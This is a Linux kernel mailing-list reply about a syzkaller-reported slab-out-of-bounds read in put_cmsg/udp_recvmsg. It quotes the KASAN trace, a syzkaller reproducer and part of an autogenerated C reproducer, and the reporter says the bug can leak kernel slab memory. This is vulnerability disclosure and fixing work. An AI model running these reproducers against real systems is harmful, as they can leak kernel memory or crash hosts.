From: Eric Dumazet <eric.dumazet@gmail.com>
Subject: Re: net/udp: slab-out-of-bounds Read in udp_recvmsg
Date: Wed, 15 Mar 2017 09:01:13 -0700
Message-ID: <1489593673.28631.150.camel@edumazet-glaptop3.roam.corp.google.com>
References: <1D28E435-EDFC-4E01-A3CE-28C83FBD27F4@gmail.com>
         <CALRZ7UuGJMuEDfzF=J6ddQD9RZSvqWQZt5-Aer68Mde5SCG79w@mail.gmail.com>
         <CACT4Y+aKW-yNfdWBvAWck3xNFKKeKEf8BNOmtFg2EZZjN98BVg@mail.gmail.com>
Mime-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable
Cc: =?UTF-8?Q?=EC=AA=BC=EB=A5=B4?= <zzoru007@gmail.com>,
        David Miller <davem@davemloft.net>,
        Alexey Kuznetsov <kuznet@ms2.inr.ac.ru>,
        James Morris <jmorris@namei.org>,
        Hideaki YOSHIFUJI <yoshfuji@linux-ipv6.org>,
        Patrick McHardy <kaber@trash.net>,
        netdev <netdev@vger.kernel.org>,
        LKML <linux-kernel@vger.kernel.org>,
        syzkaller <syzkaller@googlegroups.com>
To: Dmitry Vyukov <dvyukov@google.com>
Return-path: <linux-kernel-owner@vger.kernel.org>
In-Reply-To: <CACT4Y+aKW-yNfdWBvAWck3xNFKKeKEf8BNOmtFg2EZZjN98BVg@mail.gmail.com>
Sender: linux-kernel-owner@vger.kernel.org
List-Id: netdev.vger.kernel.org

On Wed, 2017-03-15 at 16:41 +0100, Dmitry Vyukov wrote:
> On Wed, Mar 15, 2017 at 4:25 PM, =EC=AA=BC=EB=A5=B4 <zzoru007@gmail.com> =
wrote:
> > It seems that attacker can leak kernel memory(slab) by this vulnerabili=
ty.
> > I make a PoC code, and it works well on
> > ae50dfd61665086e617cc9e554a1285d52765670.
> > but, I found that PoC wasn't work on Ubuntu16.04.02 4.4.0-64-generic
> > #85-Ubuntu SMP.
>=20
>=20
> Do you know why it is not working on Ubuntu16.04.02?
> Is it because the source bug is not present there? Or maybe you need a
> slightly different poc for that version?
>=20

Seems to be a side effect of a recent commit

( 1c885808e45601b2b6f68b30ac1d999e10b6f606 )


>=20
> > On Wed, Mar 15, 2017 at 5:34 PM, JongHwan Kim <zzoru007@gmail.com> wrot=
e:
> >>
> >>
> >> Hello,
> >>
> >> I=E2=80=99ve got the following slab-out-of-bounds Read report while ru=
nning
> >> syzkaller
> >>
> >> fuzzer on ae50dfd61665086e617cc9e554a1285d52765670.
> >>
> >>
> >> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
> >>
> >>
> >> Syzkaller hit 'KASAN: slab-out-of-bounds Read in put_cmsg' bug on comm=
it .
> >>
> >> BUG: KASAN: slab-out-of-bounds in copy_to_user
> >> arch/x86/include/asm/uaccess.h:716 [inline] at addr ffff88006bfc4054
> >> BUG: KASAN: slab-out-of-bounds in put_cmsg+0x2c4/0x3e0 net/core/scm.c:=
242
> >> at addr ffff88006bfc4054
> >> Read of size 4553 by task syz-executor3/7169
> >> CPU: 2 PID: 7169 Comm: syz-executor3 Not tainted 4.11.0-rc1+ #6
> >> Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS
> >> Ubuntu-1.8.2-1ubuntu1 04/01/2014
> >> Call Trace:
> >>  __dump_stack lib/dump_stack.c:16 [inline]
> >>  dump_stack+0x115/0x1cf lib/dump_stack.c:52
> >>  kasan_object_err+0x1c/0x70 mm/kasan/report.c:162
> >>  print_address_description mm/kasan/report.c:200 [inline]
> >>  kasan_report_error mm/kasan/report.c:289 [inline]
> >>  kasan_report.part.1+0x226/0x4f0 mm/kasan/report.c:311
> >>  kasan_report+0x21/0x30 mm/kasan/report.c:298
> >>  check_memory_region_inline mm/kasan/kasan.c:326 [inline]
> >>  check_memory_region+0x137/0x190 mm/kasan/kasan.c:333
> >>  kasan_check_read+0x11/0x20 mm/kasan/kasan.c:338
> >>  copy_to_user arch/x86/include/asm/uaccess.h:716 [inline]
> >>  put_cmsg+0x2c4/0x3e0 net/core/scm.c:242
> >>  __sock_recv_timestamp+0x4e3/0x6c0 net/socket.c:699
> >>  sock_recv_timestamp include/net/sock.h:2231 [inline]
> >>  __sock_recv_ts_and_drops+0x99/0x370 net/socket.c:732
> >>  sock_recv_ts_and_drops include/net/sock.h:2251 [inline]
> >>  udp_recvmsg+0xa4c/0x1300 net/ipv4/udp.c:1472
> >>  inet_recvmsg+0x14c/0x5f0 net/ipv4/af_inet.c:792
> >>  sock_recvmsg_nosec net/socket.c:740 [inline]
> >>  sock_recvmsg+0xc9/0x110 net/socket.c:747
> >>  ___sys_recvmsg+0x265/0x5b0 net/socket.c:2144
> >>  __sys_recvmsg+0xe2/0x210 net/socket.c:2189
> >>  SYSC_recvmsg net/socket.c:2201 [inline]
> >>  SyS_recvmsg+0x2d/0x50 net/socket.c:2196
> >>  entry_SYSCALL_64_fastpath+0x1f/0xc2
> >> RIP: 0033:0x44fb79
> >> RSP: 002b:00007f7117f47b58 EFLAGS: 00000212 ORIG_RAX: 000000000000002f
> >> RAX: ffffffffffffffda RBX: 0000000000708000 RCX: 000000000044fb79
> >> RDX: 0000000000000100 RSI: 00000000209c8fc8 RDI: 0000000000000005
> >> RBP: 0000000000000046 R08: 0000000000000000 R09: 0000000000000000
> >> R10: 0000000000000000 R11: 0000000000000212 R12: 0000000000000005
> >> R13: 00000000208f8000 R14: 00000000209c8000 R15: 0000000000000000
> >> Object at ffff88006bfc4028, in cache kmalloc-1024 size: 1024
> >> Allocated:
> >> PID =3D 7169
> >>  save_stack_trace+0x16/0x20 arch/x86/kernel/stacktrace.c:59
> >>  save_stack+0x43/0xd0 mm/kasan/kasan.c:513
> >>  set_track mm/kasan/kasan.c:525 [inline]
> >>  kasan_kmalloc+0xad/0xe0 mm/kasan/kasan.c:616
> >>  kasan_slab_alloc+0x12/0x20 mm/kasan/kasan.c:555
> >>  slab_post_alloc_hook mm/slab.h:456 [inline]
> >>  slab_alloc_node mm/slub.c:2718 [inline]
> >>  __kmalloc_node_track_caller+0x11e/0x360 mm/slub.c:4303
> >>  __kmalloc_reserve.isra.37+0x41/0xd0 net/core/skbuff.c:138
> >>  __alloc_skb+0x13b/0x740 net/core/skbuff.c:231
> >>  alloc_skb include/linux/skbuff.h:933 [inline]
> >>  alloc_skb_with_frags+0x10d/0x700 net/core/skbuff.c:4661
> >>  sock_alloc_send_pskb+0x7b4/0x9d0 net/core/sock.c:1892
> >>  sock_alloc_send_skb+0x32/0x40 net/core/sock.c:1909
> >>  __ip_append_data.isra.49+0x176b/0x2d40 net/ipv4/ip_output.c:1034
> >>  ip_append_data.part.51+0xe9/0x160 net/ipv4/ip_output.c:1235
> >>  ip_append_data+0x68/0x80 net/ipv4/ip_output.c:1224
> >>  udp_sendmsg+0x1a7f/0x2c40 net/ipv4/udp.c:1073
> >>  inet_sendmsg+0x11f/0x5e0 net/ipv4/af_inet.c:761
> >>  sock_sendmsg_nosec net/socket.c:633 [inline]
> >>  sock_sendmsg+0xca/0x110 net/socket.c:643
> >>  SYSC_sendto+0x352/0x5a0 net/socket.c:1685
> >>  SyS_sendto+0x40/0x50 net/socket.c:1653
> >>  entry_SYSCALL_64_fastpath+0x1f/0xc2
> >> Freed:
> >> PID =3D 0
> >>  save_stack_trace+0x16/0x20 arch/x86/kernel/stacktrace.c:59
> >>  save_stack+0x43/0xd0 mm/kasan/kasan.c:513
> >>  set_track mm/kasan/kasan.c:525 [inline]
> >>  kasan_slab_free+0x73/0xc0 mm/kasan/kasan.c:589
> >>  slab_free_hook mm/slub.c:1357 [inline]
> >>  slab_free_freelist_hook mm/slub.c:1379 [inline]
> >>  slab_free mm/slub.c:2961 [inline]
> >>  kfree+0xe8/0x2c0 mm/slub.c:3882
> >>  skb_free_head+0x74/0xb0 net/core/skbuff.c:579
> >>  skb_release_data+0x442/0x570 net/core/skbuff.c:610
> >>  skb_release_all+0x4a/0x60 net/core/skbuff.c:669
> >>  __kfree_skb net/core/skbuff.c:683 [inline]
> >>  consume_skb+0x153/0x480 net/core/skbuff.c:756
> >>  __dev_kfree_skb_any+0x58/0x70 net/core/dev.c:2472
> >>  dev_kfree_skb_any include/linux/netdevice.h:3231 [inline]
> >>  e1000_unmap_and_free_tx_resource.isra.48+0x1c4/0x390
> >> drivers/net/ethernet/intel/e1000/e1000_main.c:1977
> >>  e1000_clean_tx_irq drivers/net/ethernet/intel/e1000/e1000_main.c:3889
> >> [inline]
> >>  e1000_clean+0x513/0x2640
> >> drivers/net/ethernet/intel/e1000/e1000_main.c:3832
> >>  napi_poll net/core/dev.c:5266 [inline]
> >>  net_rx_action+0x6d5/0x14b0 net/core/dev.c:5331
> >>  __do_softirq+0x2d1/0xb1d kernel/softirq.c:284
> >> Memory state around the buggy address:
> >>  ffff88006bfc4300: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
> >>  ffff88006bfc4380: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
> >> >ffff88006bfc4400: 00 00 00 00 00 fc fc fc fc fc fc fc fc fc fc fc
> >>                                   ^
> >>  ffff88006bfc4480: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
> >>  ffff88006bfc4500: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
> >> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
> >> Disabling lock debugging due to kernel taint
> >> Kernel panic - not syncing: panic_on_warn set ...
> >>
> >> CPU: 2 PID: 7169 Comm: syz-executor3 Tainted: G    B           4.11.0-=
rc1+
> >> #6
> >> Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS
> >> Ubuntu-1.8.2-1ubuntu1 04/01/2014
> >> Call Trace:
> >>  __dump_stack lib/dump_stack.c:16 [inline]
> >>  dump_stack+0x115/0x1cf lib/dump_stack.c:52
> >>  panic+0x1b4/0x392 kernel/panic.c:180
> >>  kasan_end_report+0x50/0x50 mm/kasan/report.c:141
> >>  kasan_report_error mm/kasan/report.c:293 [inline]
> >>  kasan_report.part.1+0x422/0x4f0 mm/kasan/report.c:311
> >>  kasan_report+0x21/0x30 mm/kasan/report.c:298
> >>  check_memory_region_inline mm/kasan/kasan.c:326 [inline]
> >>  check_memory_region+0x137/0x190 mm/kasan/kasan.c:333
> >>  kasan_check_read+0x11/0x20 mm/kasan/kasan.c:338
> >>  copy_to_user arch/x86/include/asm/uaccess.h:716 [inline]
> >>  put_cmsg+0x2c4/0x3e0 net/core/scm.c:242
> >>  __sock_recv_timestamp+0x4e3/0x6c0 net/socket.c:699
> >>  sock_recv_timestamp include/net/sock.h:2231 [inline]
> >>  __sock_recv_ts_and_drops+0x99/0x370 net/socket.c:732
> >>  sock_recv_ts_and_drops include/net/sock.h:2251 [inline]
> >>  udp_recvmsg+0xa4c/0x1300 net/ipv4/udp.c:1472
> >>  inet_recvmsg+0x14c/0x5f0 net/ipv4/af_inet.c:792
> >>  sock_recvmsg_nosec net/socket.c:740 [inline]
> >>  sock_recvmsg+0xc9/0x110 net/socket.c:747
> >>  ___sys_recvmsg+0x265/0x5b0 net/socket.c:2144
> >>  __sys_recvmsg+0xe2/0x210 net/socket.c:2189
> >>  SYSC_recvmsg net/socket.c:2201 [inline]
> >>  SyS_recvmsg+0x2d/0x50 net/socket.c:2196
> >>  entry_SYSCALL_64_fastpath+0x1f/0xc2
> >> RIP: 0033:0x44fb79
> >> RSP: 002b:00007f7117f47b58 EFLAGS: 00000212 ORIG_RAX: 000000000000002f
> >> RAX: ffffffffffffffda RBX: 0000000000708000 RCX: 000000000044fb79
> >> RDX: 0000000000000100 RSI: 00000000209c8fc8 RDI: 0000000000000005
> >> RBP: 0000000000000046 R08: 0000000000000000 R09: 0000000000000000
> >> R10: 0000000000000000 R11: 0000000000000212 R12: 0000000000000005
> >> R13: 00000000208f8000 R14: 00000000209c8000 R15: 0000000000000000
> >> Dumping ftrace buffer:
> >>    (ftrace buffer empty)
> >> Kernel Offset: disabled
> >> Rebooting in 86400 seconds..
> >>
> >>
> >> Syzkaller reproducer:
> >> # {Threaded:true Collide:false Repeat:false Procs:1 Sandbox:setuid
> >> Repro:false}
> >> mmap(&(0x7f0000000000/0x9c9000)=3Dnil, (0x9c9000), 0x3, 0x32,
> >> 0xffffffffffffffff, 0x0)
> >> r0 =3D socket$udp(0x2, 0x2, 0x0)
> >> r1 =3D dup2(r0, r0)
> >> setsockopt$sock_int(r0, 0x1, 0x6, &(0x7f0000549000-0x4)=3D0x906, 0x4)
> >> bind$inet(r1, &(0x7f00004de000)=3D{0x2, 0x0, @loopback=3D0x7f000001, [=
0x0,
> >> 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0]}, 0x10)
> >> sendto$inet(r0, &(0x7f00001cc000)=3D"", 0x0, 0x8000,
> >> &(0x7f00009c5000-0x10)=3D{0x2, 0x2, @broadcast=3D0xffffffff, [0x0, 0x0=
, 0x0,
> >> 0x0, 0x0, 0x0, 0x0, 0x0]}, 0x10)
> >> connect$inet(r1, &(0x7f0000994000)=3D{0x2, 0x0, @loopback=3D0x7f000001=
, [0x0,
> >> 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0]}, 0x10)
> >> recvmsg(r0, &(0x7f00009c9000-0x38)=3D{&(0x7f000083f000-0x1)=3Dnil, 0x0=
,
> >> &(0x7f00009c9000-0x10)=3D[{&(0x7f00009c1000)=3D"", 0x0}], 0x1,
> >> &(0x7f00009c8000)=3D"", 0x0, 0xfffffffffffff7fd}, 0x100)
> >> setsockopt$SO_TIMESTAMPING(r0, 0x1, 0x25, &(0x7f0000104000-0x4)=3D0x19=
fe,
> >> 0x4)
> >> write(r1,
> >> &(0x7f00009c4000-0x1000)=3D"9738d2893360cc306cd63cf6f51d0d94090bc87a8d=
b314a96dec1bf054e4fc7acc872318c996115b4727360c631bcb22f07ad51387bca34c27949=
b818c29441828d58b0ebaaa050b7400639df4b427bdb48eab608e894cf0388a1a3ab51fb299=
1d20dd45c99904d0519f83fb3efbdf5b339c9c0e881d895e57dbb4b9142ae154b333e8ded71=
c9a32ed58e5922d2cf648a65d9ff691eaa3955aa1caddb2e900bf9aee42ae33c55a1efb9f81=
e4520f0ceecc62c3fba89d1624d8d198ae394dcefde620c7dc87d7096d1c60191f160aae87b=
9bcd172f3a4cd6e1eca6e6d28fcaadf85d373a006001a8e1d08fdc0644a5d1e52d886d75edf=
d61a5cc55a3accb230709a912963f36992fd650a8e014a4bd03ca57b795d314a4c82dd17ed0=
8ca49de6824eb65b23e31977bf26fe8edd3b5c7276c28389a4e75bc25c10f268be20768edd9=
e0fc9b103fc14381e3f29e4502b5009891207027c3f06b5fbd845215b25594d9f8db9a8d77f=
51110795cc40ead2f4c72437c3436c878f950378d141d0ef38ec95d608b7e0cf0bfc77a40b1=
08f045899da908b6e7222aedc00d23d131b439ebeccfd2d4a659e22fc007912179c2c310e7e=
dc7d89b8ade98344deaea0c23e6be6ec74d50b8df807db35dfc77d070a9a336ff54c9b4f157=
838b169e543d11d396db96c6f1600458b5c50138648246036518504334d99da6346eee8f752=
9036e4fb8d6e1b56ce992bdaf5731ff1ae6c39dae0823de6a19fa559011f3233a81d215c89b=
b086b80f8a489856583b87922be8686a41061202214fb64ff01c0f6fe39e7865906eaa48592=
399a8f77c8526ec369250e0bc82deb501c8b1a41bc122ee4d386b1a53d1f4f45c429bb3796f=
23465e9fa273684da12063fe2b69b1a80a27fcd3965c45ca4824bf218744f02fe830e3099f7=
1e7472158185462fbccda4c096e5f29b7c261ec2e9eee23ab18855971ee79982f605df2491b=
b9db4247402c5ce131c53391729f5a2f38b74828e5eb7e1a5b0bd6d66e413dd859681610a1b=
2c55cd71fdd2be54e2344db70a8cc81345a79f47a8c57dc0499b25790dfeb4e82069e545bff=
76fa33bca1d4efd3e18436f23bb17bd18a53830e6b8f48056a4de9e4a9bd75e4aab6738617b=
6a9310a2ee8098cd19a0ea42a857ea81307c480383172b1bcdc0b47072c903e57b31055666c=
8d3676fe3cee4d8163b6e9f4e3c42fb59786c8bcb4d42615dc1b0c57b3ef66925e94c8b2c94=
b9e1e76d17430a47ec34e8c6b4a0555b19ae41d12d2e6193d66703294240b31abbb866de6cf=
471226f798d60ac4053a82270965dafb460040cf904ca2ff7f9ade8651588d5b7275c1cadae=
d4be75532bdd853045994169f50287078cf2badf9695aea98ab67c5cb6637d97a4877bb9654=
e25e01045299191e01e73c6205e0d5c54e103ce352ff41da80ba1f4649c64f33b0bf335abae=
9b159ae1293ed8b1b349a01d8ccf0efbed9df046bf56002ffcc8a69d400c1c88bbfd5dbf68d=
1ba8113f989b0df7122e55fe6f1b017fe422978c6ea8833b43a94c6c47c63b978b020010e4e=
5ad61fe2ce6283a59d5bb460c58b3a8d7e03e120d1af3feabf252458feb9a1fed216b6d2dff=
7aed7138a727307838815b28660e28cc6b2c10ef36f4d58b0c67b4bb33d361c30328ad4a0ea=
bf9b47adcf315aa078ec7c4974de4cf695aa4c2bd60dd0a2d8ba061c262bddd840d1ad36cd2=
7bae9b290fece5e411398ded5abe7f5ef8b60385fec7485b1c6c4b6681f3c4b17eaaba32abb=
6fb4e67bc83e7e8a3de763b7656674d66f46b0b559c8cbca337b27dae2a07fd17c733f1a999=
de7927ac25f9daec36fc30f2850af3c4b3beada6395c0804a737e7bfca8386506cd9d53bcba=
7ad592adf9c6187a052653a863d24e6bf51d282d7217fa3757b745faeef6972413592d48837=
bac9cdd9ebe601770b17a24f36edffc7ad704b106dc1dee3072be64bcd5a128540e78f9c0fb=
b74955093743921165f09a9d67ac479c23e1c6307d9d07a16ed4da45d83a0f3d0e0d3139445=
f98a8772186a953b8084a935a2c75d56cb94fb718bf34de46b97250f78e8d23df816853e8fc=
754c152a536d665718a484c23cbce8daf33707c8392420c58647b0a89ea9e3b2eb88eb09157=
972cae4b1e647a0145d2ad9325728189216acae7db16729c678e3584b7ad551b279b2a890a0=
a0a9d7cbee2a2203d90ef1136ff002a536f02d64c2562fdda1872ad280791d20870c9739d1e=
9845cbfd0c022db89acdac00f243fd9d48c4035846104c8c3422a3a3d1c4b1a139c3bcc43aa=
ee29f28a69cf07b85e1e5cc5dbb65071a9c78e4e4923ef4c7dfcc1965ac136c8e684cdb2ca7=
13591ae8613675ab45ff030d315e8a87677714ce25aa565fe7114eadc5e6421d7ac6823414d=
ff50ea2f3e1c4b9c1f6432671b0ac713f50818ddd5dde7aa79b69d8afef6f37e69f29fb82c0=
2e66093daa2616ff2c0100fce9831e6f58c199f15775f036fa9e9e6a65520f9faac014984f6=
c4cedc6e978c739a946d1741fc3f526f341c5dd1f92628ecc264bdecba7f109a113fe29f1f3=
613cbb6fef936ea538a534198962a3f4dbad2beaad9195f8b600d86dca1fa741cf494099657=
1d9863c8c3a1c806eec8555c8b3e6b0e0a4f31023134e583769a89e609015ea47fe09e34daa=
a1e98be593e35d9b3e625b07990392d2ecac7767f0c0216e24b5c1d6d4ece83a76db86aa4f9=
fb618ec42c934f48985d1f2f57c700189dbe5cb5f1ff4f0b05c0a3e9893729a26cabe9600b7=
20071cd4f103fd3dfee1b9e0f5a36beddc5b112c3126395d1cbc50be436bc0650a61f269c4e=
b352f57c782afe56f1810c1db425fc1861fa9027bc575abc23bd25f9b6a6b6e623ddb57223e=
5d3633e3b23f050d23d6de64585b24f94be2dfe999d1768f8a2165cdb92a04fefab3dc9f33b=
109a0088ee0a3c67eb245077392d5601eb7f25b7002a7389513715f406df606f611033f1777=
a8f8d835f260a1d8c514bcf8eab68e80ee2e0211f7d651d4517ac88009000000018dbc2056f=
37cb7b014d10914edeb275fcc2e06d0734cac74625b32ec7295a938d1da64cad9931c4cbc52=
a9dd5cb2ae14f91eef1b9dc31b1afa6301a0897815e093c53405e121f618eb541693532ecef=
03acd3556ea056d78a0e0c6a30c5077e5e30a5c9c1ee80f40e3d1c0ee5021f8050577826964=
2ad1d30d41360806c3dfd49666cd72c7d1df7c496f4c63aad7d654455358dbac87fa6f00b9a=
1b8e432f09751ba4c30e05118f79c7336493394868bd698aca5862940bd64406ddf683911d5=
059fca2df97c730b063defb4c71e8e0ca4c67a9cc925e2ea96fa0f0f674ba7fc46d7ff79c36=
fdf18b71a8e606f8b053e91709f6e9ca7734ce5d8b21fdef8545e0ec0659fc4fd9cb31d22ba=
89ab97bea4cd811d5c11636b4a1fb909ae4907748902c009b3fb5ef93e0a5a125fc5df5fc8e=
013a9ae0b72f98d26428f351778321c017f73b7cf8473fbbfee7425b3d7d04d593c639495f7=
0b3e16f537643ef5175ad5cdb092f22867c87f39e45976f8fcef4cd4ca7d0b429dd116b8bea=
828c6fd7faf55173881516d9b0701cabcdaf8b95b4497f0a8589330ff70391fa86de97069c7=
df7a229a4288b29007d576a9e82f2d9633732d2584bc05d4f784637b5acee4a793e86be8f1e=
9a5c8c533d7a3536e402dcc217913689484cde2804f754d3e370f208bf0478b60b54931657b=
7dca825468165daff6529258bd28b1374ef05d9ab669ea517b900c1e5b673d4043c50d8912b=
e5f53a19cd06427c2c2188b3a842280c724d0a338cc68d6ac641f4bafad1e163169f4695400=
341b5d52773d8857a015050a4f08380d4a1f2d45c49867601f12774a09a4d6eec43ff7f8e52=
eb35e097a9257114ca71f0f1f0a254f6554e488db9e24df9e9dca24b22656ee1f31cec9b19f=
a311278f5a23bf951b5bd7dbf79d9e71b4fc9c6b67ff09a15334f0e94c20799cd1c94fab1c5=
387cd73d73bd9aa37fc36642707ba289256abe1c720cd1337f2d0921635c4a0d694e6d48474=
5fd35c29fc4c95bac5f6e6ffce399b832805a7fa3fe94af3e5def319452a264ba1838b67fc3=
87741fa616eeaea4aad6d62db3da199f7aec8eeee058f065c46bed9c6f6465bef139239f44c=
8b3acf775118caac5340b7dcc6aca20d54db8ae1a698df4b9d1c904ab28dcfc678e513b0c74=
8f6851d8ff4d8d4820c1ac27bcddd7d7b1ac83f84a1b1c2301de6fd3e0b3d18f7752185b23c=
47a657f3107ec8a38fa3d380e027d7a3bb7c96c7d918ce532dc4ee57a4928f9982d8dca7243=
612ec364ee711e1735fab160ab5b59db2f5ad938ef4dc76115640386f982b55742e552a053d=
4389840e32c8d48dc1118bec0b68ef96af78e88f288d8fd03a6276b022dac40f19e80270dbd=
5b306db59953d0e9b82f30f2973627d9d0255cdf7b1bba93254de6d9c97a2987c7af2551812=
c2b21496b56863058a967a00f38b6843619332dd9bf80eb1cebf7b6bcdc3e68af282b614a28=
159deb244e1fd3801ba8063de23e5924597cecc5320714b79848ea351d71fdea7e5d68d631b=
ab67d7012cf463dd394a9c5f9b7a3feb2a66dbca4374b31ccedb15d0312ad61d41cf4e794d3=
a7f4f03268088e0e406dee377bc1ad341e12fca27f600a74ca747f348ff9d857dee9fdd720d=
6ed5fc8403d7d911c282888a29bfa58727e77dae8f4f1800d4caf8b946fbee13efee5c60e40=
f5d5c6a4d6d1483de6447bd1bdc1f7e70f49de11bb13c70bdd31f8b160d6ec72b59f4ec89cd=
9e410b92d9ca87a68103640e2a9aeeb099e6767991ad9a275e1a096a55d69904ef991ba1fee=
639696ce7279645dde58699eeee41ed65996ab29e352886e1142528b4fff1d3ebdf43e5f540=
0ba457cc5f77f615e8feab552b47fea6f31f0188b9fe614bea3a40d6b71746054f3e93c9b9c=
99d79a36a0ffb0f05a5160cd6c1eb76a2d14014883ef8922907da186c6ad19fbb71f595d15c=
2c213d6802001cdab41db1d167ced2d3c897c1cd8a868410f65d2287c7a972931c379659d4c=
30f7783992db5e7d3f72afdcad45885e4f4d33e506607a4da6dc7ab892f71bf6dfefd13d636=
d23d711098a22ba3073c026edb33f0fcb7575f446e94be979c1438ceb5af6fdf005f1577b11=
ab08f47a4d27e2bfe7504ed291c744c2932bc8cb81aabdd909c4427da53f0a304db60ceb334=
bfc905ee2ff5d75f2a83f56b324174e9a8d1c9f1ee88849db9d6f5c2f8426e708bfd9136ffe=
cc418d9d55bba1898fb1c643995dbfbf9e92412710ed3c94a5473ebd0bc31ec5240b887d2e2=
6e3392385b6851557ccd6053e2066f99928a0599a17519237fa9806c3823390cb80e94d59df=
ff75d5355d01377eeb00e70033ba158f09c3d93419763ad65a1a01cb83218040b13b4473542=
666fa94920805242c1abc43c6be7776700843292a53db6febf60ae3748f16c34e3b9ab9ff18=
2a671410ee64c3892253af8bdf9f07da809877ef81d421c1420c7df4d5febbb3b068be514d5=
53339d0ebc726c834dad9eb46620b59501b3899fc392b1445bcad8c10ca5b8ef75d64ae23f1=
6ed42deff64c06f2c0f9f0d3719720d591e1c455f14eaa33611cac4820562ab5ba3f4d0e364=
8a239c635d14ca30780a7e9de3617bddbd7da726b753e92ec172737bd2ad996ceed3b5aa4a8=
5d4acca07f43f9fc13b4f555b297e394ed7ee6abba24048a0da4c30c02e1f838a3e4b34a871=
4024027cf1ad4fa07af5cb56d4496bb8122244dc566fa92e0a",
> >> 0x1000)
> >>
> >>
> >> C reproducer:
> >> // autogenerated by syzkaller (http://github.com/google/syzkaller)
> >>
> >> #ifndef __NR_bind
> >> #define __NR_bind 49
> >> #endif
> >> #ifndef __NR_write
> >> #define __NR_write 1
> >> #endif
> >> #ifndef __NR_recvmsg
> >> #define __NR_recvmsg 47
> >> #endif
> >> #ifndef __NR_mmap
> >> #define __NR_mmap 9
> >> #endif
> >> #ifndef __NR_socket
> >> #define __NR_socket 41
> >> #endif
> >> #ifndef __NR_dup2
> >> #define __NR_dup2 33
> >> #endif
> >> #ifndef __NR_setsockopt
> >> #define __NR_setsockopt 54
> >> #endif
> >> #ifndef __NR_sendto
> >> #define __NR_sendto 44
> >> #endif
> >> #ifndef __NR_connect
> >> #define __NR_connect 42
> >> #endif
> >>
> >> #define __STDC_VERSION__ 201112L
> >>
> >> #define _GNU_SOURCE
> >>
> >> #include <sys/ioctl.h>
> >> #include <sys/mman.h>
> >> #include <sys/mount.h>
> >> #include <sys/prctl.h>
> >> #include <sys/resource.h>
> >> #include <sys/socket.h>
> >> #include <sys/stat.h>
> >> #include <sys/syscall.h>
> >> #include <sys/time.h>
> >> #include <sys/types.h>
> >> #include <sys/wait.h>
> >>
> >> #include <linux/capability.h>
> >> #include <linux/if.h>
> >> #include <linux/if_tun.h>
> >> #include <linux/kvm.h>
> >> #include <linux/sched.h>
> >> #include <net/if_arp.h>
> >>
> >> #include <assert.h>
> >> #include <dirent.h>
> >> #include <errno.h>
> >> #include <fcntl.h>
> >> #include <grp.h>
> >> #include <pthread.h>
> >> #include <setjmp.h>
> >> #include <signal.h>
> >> #include <stdarg.h>
> >> #include <stdbool.h>
> >> #include <stddef.h>
> >> #include <stdint.h>
> >> #include <stdio.h>
> >> #include <stdlib.h>
> >> #include <string.h>
> >> #include <unistd.h>
> >>
> >> const int kFailStatus =3D 67;
> >> const int kErrorStatus =3D 68;
> >> const int kRetryStatus =3D 69;
> >>
> >> __attribute__((noreturn)) void doexit(int status)
> >> {
> >>   volatile unsigned i;
> >>   syscall(__NR_exit_group, status);
> >>   for (i =3D 0;; i++) {
> >>   }
> >> }
> >>
> >> __attribute__((noreturn)) void fail(const char* msg, ...)
> >> {
> >>   int e =3D errno;
> >>   fflush(stdout);
> >>   va_list args;
> >>   va_start(args, msg);
> >>   vfprintf(stderr, msg, args);
> >>   va_end(args);
> >>   fprintf(stderr, " (errno %d)\n", e);
> >>   doexit((e =3D=3D ENOMEM || e =3D=3D EAGAIN) ? kRetryStatus : kFailSt=
atus);
> >> }
> >>
> >> __attribute__((noreturn)) void exitf(const char* msg, ...)
> >> {
> >>   int e =3D errno;
> >>   fflush(stdout);
> >>   va_list args;
> >>   va_start(args, msg);
> >>   vfprintf(stderr, msg, args);
> >>   va_end(args);
> >>   fprintf(stderr, " (errno %d)\n", e);
> >>   doexit(kRetryStatus);
> >> }
> >>
> >> static int flag_debug;
> >>
> >> void debug(const char* msg, ...)
> >> {
> >>   if (!flag_debug)
> >>     return;
> >>   va_list args;
> >>   va_start(args, msg);
> >>   vfprintf(stdout, msg, args);
> >>   va_end(args);
> >>   fflush(stdout);
> >> }
> >>
> >> __thread int skip_segv;
> >> __thread jmp_buf segv_env;
> >>
> >> static void segv_handler(int sig, siginfo_t* info, void* uctx)
> >> {
> >>   uintptr_t addr =3D (uintptr_t)info->si_addr;
> >>   const uintptr_t prog_start =3D 1 << 20;
> >>   const uintptr_t prog_end =3D 100 << 20;
> >>   if (__atomic_load_n(&skip_segv, __ATOMIC_RELAXED) &&
> >>       (addr < prog_start || addr > prog_end)) {
> >>     debug("SIGSEGV on %p, skipping\n", addr);
> >>     _longjmp(segv_env, 1);
> >>   }
> >>   debug("SIGSEGV on %p, exiting\n", addr);
> >>   doexit(sig);
> >>   for (;;) {
> >>   }
> >> }
> >>
> >> static void install_segv_handler()
> >> {
> >>   struct sigaction sa;
> >>   memset(&sa, 0, sizeof(sa));
> >>   sa.sa_sigaction =3D segv_handler;
> >>   sa.sa_flags =3D SA_NODEFER | SA_SIGINFO;
> >>   sigaction(SIGSEGV, &sa, NULL);
> >>   sigaction(SIGBUS, &sa, NULL);
> >> }
> >>
> >> #define NONFAILING(...)                                               =
 \
